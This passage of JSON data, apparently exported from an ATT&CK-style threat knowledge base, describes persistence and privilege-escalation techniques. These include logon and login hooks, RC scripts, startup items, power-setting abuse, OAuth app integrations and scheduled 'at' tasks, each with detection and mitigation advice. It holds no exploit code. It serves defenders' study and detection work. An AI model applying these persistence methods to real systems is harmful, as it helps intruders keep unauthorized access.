target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Conditional Access Policies)</a> In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain <code>condition</code> attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS IAM Conditions)</a> <a href=\"https://cloud.google.com/iam/docs/conditions-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP IAM Conditions)</a> These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.","detection":"","platforms":["IaaS","Identity Provider"],"dataSources":["Active Directory: Active Directory Object Modification","Cloud Service: Cloud Service Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to modify conditional access policies to only those required."}]}]},{"id":"T1653","name":"Power Settings","description":"Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity. <a href=\"https://www.avg.com/en/signal/should-you-shut-down-sleep-or-hibernate-your-pc-or-mac-laptop\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sleep, shut down, hibernate)</a>\n\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity. <a href=\"https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/powercfg-command-line-options?adlt=strict\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft: Powercfg command-line options)</a> <a href=\"https://man7.org/linux/man-pages/man5/systemd-sleep.conf.5.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: systemdsleep Linux)</a>\n\nFor example, <code>powercfg</code> controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down. <a href=\"https://securityintelligence.com/news/two-new-monero-malware-attacks-target-windows-and-android-users/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Two New Monero Malware Attacks Target Windows and Android Users)</a> Adversaries may also extend system lock screen timeout settings. <a href=\"https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BATLOADER: The Evasive Downloader Malware)</a> Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active. <a href=\"https://www.avira.com/en/blog/coinloader-a-sophisticated-malware-loader-campaign\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)</a>\n\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot. <a href=\"https://www.fortinet.com/blog/threat-research/condi-ddos-botnet-spreads-via-tp-links-cve-2023-1389\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Condi-Botnet-binaries)</a>","detection":"Command-line invocation of tools capable of modifying services may be unusual and can be monitored for and alerted on, depending on how systems are typically used in a particular environment.","platforms":["Windows","Linux","macOS","Network Devices"],"dataSources":["File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1047","name":"Audit","description":"Periodically inspect systems for abnormal and unexpected power settings that may indicate malicious activty."}],"subTechniques":[]},{"id":"T1668","name":"Exclusive Control","description":"Adversaries who successfully compromise a system may attempt to maintain persistence by “closing the door” behind them  – in other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system. \n\nFor example, adversaries may patch a vulnerable, compromised system <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant-iab-control)</a> <a href=\"https://www.cert.at/de/warnungen/2025/3/ransomware-gruppen-nutzen-weiterhin-kritische-fortinet-schwachstellen-warnung-vor-gepatchten-aber-bereits-kompromittierten-geraten\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT AT Fortinent Ransomware 2025)</a> to prevent other threat actors from leveraging that vulnerability in the future. They may “close the door” in other ways, such as disabling vulnerable services <a href=\"https://news.sophos.com/en-us/2022/08/09/multiple-attackers-increase-pressure-on-victims-complicate-incident-response/#:~:text=While%20some%20threat%20actors%20are%20interdependent%20%28e.g.%2C%20IABs,vulnerabilities%20or%20disabling%20vulnerable%20services%20after%20gaining%20access\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sophos-multiple-attackers)</a>, stripping privileges from accounts <a href=\"https://www.aquasec.com/blog/pg_mem-a-malware-hidden-in-the-postgres-processes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: aquasec-postgres-processes)</a>, or removing other malware already on the compromised device. <a href=\"https://www.f-secure.com/v-descs/netsky-h.shtml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: fsecure-netsky)</a>\n\nHindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the “noise” in the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case of Resource Hijacking, leveraging a compromised device’s full power allows the threat actor to maximize profit. <a href=\"https://news.sophos.com/en-us/2022/08/09/multiple-attackers-increase-pressure-on-victims-complicate-incident-response/#:~:text=While%20some%20threat%20actors%20are%20interdependent%20%28e.g.%2C%20IABs,vulnerabilities%20or%20disabling%20vulnerable%20services%20after%20gaining%20access\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sophos-multiple-attackers)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[],"subTechniques":[]},{"id":"T1671","name":"Cloud Application Integration","description":"Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends. <a href=\"https://pushsecurity.com/blog/maintaining-persistent-access-in-a-saas-first-world/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Push Security SaaS Persistence 2022)</a> <a href=\"https://github.com/pushsecurity/saas-attacks/blob/main/techniques/evil_twin_integrations/description.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SaaS Attacks GitHub Evil Twin Integrations)</a>\n\nOAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks.  \n\nLeveraging application integrations may allow adversaries to persist in an environment – for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account. <a href=\"https://www.wiz.io/blog/midnight-blizzard-microsoft-breach-analysis-and-best-practices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wiz Midnight Blizzard 2024)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-OAuth-applications-used-to-compromise-email-servers-and-spread-spam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Malicious OAuth Applications 2022)</a> <a href=\"https://www.huntress.com/blog/legitimate-apps-as-traitorware-for-persistent-microsoft-365-compromise\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Huntress Persistence Microsoft 365 Compromise 2024)</a> In some cases, integrations may remain valid even after the original consenting user account is disabled. <a href=\"https://pushsecurity.com/blog/phishing-slack-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Push Security Slack Persistence 2023)</a> Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of Application Access Tokens. Finally, they may enable persistent Automated Exfiltration over time. <a href=\"https://cybercorner.tech/malicious-azure-application-perfectdata-software-and-office365-business-email-compromise/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Synes Cyber Corner Malicious Azure Application 2023)</a>\n\nCreating or adding a new application may require the adversary to create a dedicated Cloud Account for the application and assign it Additional Cloud Roles – for example, in Microsoft 365 environments, an application can only access resources via an associated service principal. <a href=\"https://learn.microsoft.com/en-us/entra/identity-platform/app-objects-and-service-principals?tabs=browser\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Entra ID Service Principals)</a>","detection":"","platforms":["Office Suite","SaaS"],"dataSources":[],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Do not allow users to add new application integrations into a SaaS environment. In Entra ID environments, consider enforcing the “Do not allow user consent” option. <a href=\"https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/configure-user-consent?pivots=portal\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Entra Configure OAuth Consent)</a>"},{"id":"M1047","name":"Audit","description":"Periodically review SaaS integrations for unapproved or potentially malicious applications."}],"subTechniques":[]}]},{"tactic":"Privilege Escalation","techniques":[{"id":"T1037","name":"Boot or Logon Initialization Scripts","description":"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. <a href=\"https://www.mandiant.com/resources/blog/unc3524-eye-spy-email\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Eye Spy Email Nov 22)</a> <a href=\"https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Rocke March 2019)</a> Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Modification","Windows Registry: Windows Registry Key Creation","Command: Command Execution","File: File Creation","Process: Process Creation","Active Directory: Active Directory Object Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to logon scripts to specific administrators."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence."}],"subTechniques":[{"id":"T1037.001","name":"Logon Script (Windows)","description":"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. <a href=\"https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Logon Scripts)</a> This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key. <a href=\"http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn Logon Scripts)</a>\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.","detection":"Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\Environment\\UserInitMprLogonScript</code>.\n\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Windows Registry: Windows Registry Key Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence."}]},{"id":"T1037.002","name":"Login Hook","description":"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks. <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Login Scripts Apple Dev)</a> <a href=\"https://developer.apple.com/documentation/devicemanagement/loginwindowscripts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LoginWindowScripts Apple Dev)</a> \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time. <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: S1 macOs Persistence)</a> <a href=\"https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Persistence Chapter)</a>\n\n<strong>Note:</strong> Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["macOS"],"dataSources":["File: File Creation","File: File Modification","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to logon scripts to specific administrators."}]},{"id":"T1037.003","name":"Network Logon Script","description":"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. <a href=\"https://www.petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Petri Logon Script AD)</a> These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["Windows"],"dataSources":["Command: Command Execution","Active Directory: Active Directory Object Modification","File: File Modification","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to logon scripts to specific administrators."}]},{"id":"T1037.004","name":"RC Scripts","description":"Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution. <a href=\"https://iranthreats.github.io/resources/attribution-flying-rocket-kitten/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IranThreats Kittens Dec 2017)</a> <a href=\"https://www.intezer.com/blog-hiddenwasp-malware-targeting-linux-systems/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer HiddenWasp Map 2019)</a> Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems. <a href=\"https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: intezer-kaiji-malware)</a> As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging <code>/etc/rc.local.d/local.sh</code> is one of the few mechanisms for enabling persistence across reboots. <a href=\"https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper Networks ESXi Backdoor 2022)</a>\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd. <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Archive Launchd)</a> <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items)</a> This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions. <a href=\"http://manpages.ubuntu.com/manpages/bionic/man8/systemd-rc-local-generator.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ubuntu Manpage systemd rc)</a>","detection":"Monitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.\n\nMonitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present.","platforms":["macOS","Linux","Network Devices","ESXi"],"dataSources":["File: File Creation","Process: Process Creation","File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Limit privileges of user accounts so only authorized users can edit the <code>rc.common</code> file."}]},{"id":"T1037.005","name":"Startup Items","description":"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items)</a>\n\nThis is technically a deprecated technology (superseded by Launch Daemon), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.","detection":"The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\n\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Creation","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Since StartupItems are deprecated, preventing all users from writing to the <code>/Library/StartupItems</code> directory would prevent any startup items from getting registered."}]}]},{"id":"T1053","name":"Scheduled Task/Job","description":"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system. <a href=\"https://technet.microsoft.com/en-us/library/cc785125.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Task Scheduler Security)</a>\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProofPoint Serpent)</a>","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Scheduled Job: Scheduled Job Creation","File: File Creation","Process: Process Creation","Container: Container Creation","Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access by setting directory and file permissions that are not specific to users or privileged accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"}],"subTechniques":[{"id":"T1053.002","name":"At","description":"Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the <code>at</code> command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation <code>Win32_ScheduledJob</code> WMI class. <a href=\"https://www.cybereason.com/blog/wmi-lateral-movement-win32#blog-subscribe\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Life by Cybereason)</a>\n\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke at. If the <code>at.deny</code> exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at. <a href=\"https://man7.org/linux/man-pages/man1/at.1p.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux at)</a>\n\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via <code>sudo</code>. <a href=\"https://gtfobins.github.io/gtfobins/at/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFObins at)</a>","detection":"Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. <a href=\"https://x.com/leoloobeek/status/939248813465853953\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Leoloobeek Scheduled Task)</a> If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. <a href=\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Forum Scheduled Task Operational Setting)</a> Several events will then be logged on scheduled task activity, including: <a href=\"https://technet.microsoft.com/library/dd315590.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduled Task Events)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Scheduled Task Events Win10)</a>\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\nIn Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nReview all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All at jobs are stored in <code>/var/spool/cron/atjobs/</code>. <a href=\"https://www.linkedin.com/pulse/getting-attacker-ip-address-from-malicious-linux-job-craig-rowland/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rowland linux at 2019)</a>\n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows","Linux","macOS"],"dataSources":["Command: Command Execution","Scheduled Job: Scheduled Job Creation","Network Traffic: Network Traffic Flow","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. In Linux environments, users account-level access to <code>at</code> can be managed using <code>at.allow</code> and <code>at.deny</code> files. Users listed in the at.allow are enabled to schedule actions using at, whereas users listed in at.deny file disabled from the utility."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> Windows operating system also creates a registry key specifically associated with the creation of a scheduled task on the destination host at: Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\At1. <a href=\"https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secureworks - AT.exe Scheduled Task)</a> In Linux and macOS environments, scheduled tasks using <code>at</code> can be audited locally, or through centrally collected logging, using syslog, or auditd events from the host. <a href=\"https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kifarunix - Task Scheduling in Linux)</a>"}]},{"id":"T1053.003","name":"Cron","description":"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. <a 